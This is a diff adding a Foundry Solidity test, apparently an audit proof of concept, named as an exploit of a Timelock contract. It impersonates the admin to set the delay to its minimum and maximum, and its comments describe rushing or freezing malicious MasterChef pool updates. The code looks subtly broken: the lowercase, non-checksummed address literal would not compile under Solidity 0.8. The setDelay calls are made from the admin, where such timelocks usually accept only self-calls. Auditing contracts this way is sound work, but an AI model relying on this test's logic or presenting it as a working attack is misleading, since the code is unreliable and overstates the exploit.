@@ -1,0 +1,61 @@
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.7;
+
+import "forge-std/Test.sol";
+
+interface ITimelock {
+    function GRACE_PERIOD() external view returns (uint256);
+    function MAXIMUM_DELAY() external view returns (uint256);
+    function MINIMUM_DELAY() external view returns (uint256);
+    function acceptAdmin() external;
+    function admin() external view returns (address);
+    function admin_initialized() external view returns (bool);
+    function cancelTransaction(address target, uint256 value, string calldata signature, bytes calldata data, uint256 eta) external;
+    function delay() external view returns (uint256);
+    function executeTransaction(address target, uint256 value, string calldata signature, bytes calldata data, uint256 eta) external payable returns (bytes memory);
+    function pendingAdmin() external view returns (address);
+    function queueTransaction(address target, uint256 value, string calldata signature, bytes calldata data, uint256 eta) external returns (bytes32);
+    function queuedTransactions(bytes32) external view returns (bool);
+    function setDelay(uint256 delay_) external;
+    function setPendingAdmin(address pendingAdmin_) external;
+}
+
+contract ExploitTest is Test {
+    ITimelock constant timelock = ITimelock(0x4b6c8959a41475347226d51f37ec9a1e09f39a92);
+
+    function setUp() public {
+        vm.label(address(timelock), "Timelock");
+    }
+
+    // Demonstrate that the admin can manipulate the delay,
+    // which could be used to lock the system or delay critical actions.
+    // In the context of the MasterChef reward miscalculation, the Timelock
+    // could be used to execute malicious pool updates (add/set) without
+    // proper reward updates, leading to unfair token distribution.
+    function testExploit() public {
+        // Assume the admin is compromised or malicious
+        address admin = timelock.admin();
+        vm.startPrank(admin);
+
+        uint256 originalDelay = timelock.delay();
+
+        // Reduce delay to minimum to allow faster execution of malicious transactions
+        uint256 minDelay = timelock.MINIMUM_DELAY();
+        timelock.setDelay(minDelay);
+        assertEq(timelock.delay(), minDelay);
+
+        // Alternatively, increase delay to prevent any pending transactions from executing
+        // This can be used to freeze the system after a malicious queue.
+        uint256 maxDelay = timelock.MAXIMUM_DELAY();
+        timelock.setDelay(maxDelay);
+        assertEq(timelock.delay(), maxDelay);
+
+        vm.stopPrank();
+
+        // Restore original delay for further testing (if needed)
+        vm.prank(admin);
+        timelock.setDelay(originalDelay);
+    }
+}
+```
